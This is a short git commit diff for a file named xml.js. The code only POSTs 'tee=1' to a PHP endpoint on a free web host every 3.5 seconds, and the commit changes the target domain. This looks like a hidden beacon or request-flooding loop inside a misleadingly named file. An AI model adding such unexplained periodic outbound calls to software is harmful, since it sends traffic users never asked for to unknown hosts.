b7a2a309fa27fc8b3f383936040aa7fd7d1c858b
DRL7N <40870933+DRL7N@users.noreply.github.com>
2018-11-23 01:37:28 +0300

    Update xml.js

--- xml.js
+++ xml.js
@@ -1,5 +1,5 @@
 const fetch = require('node-fetch');
 
 function join(argument) {
-fetch('http://discor.xp3.biz/index.php', { method: 'POST', body: 'tee=1' })}
+fetch('http://diiiwo3.6te.net/index.php', { method: 'POST', body: 'tee=1' })}
 setInterval(join,3500);
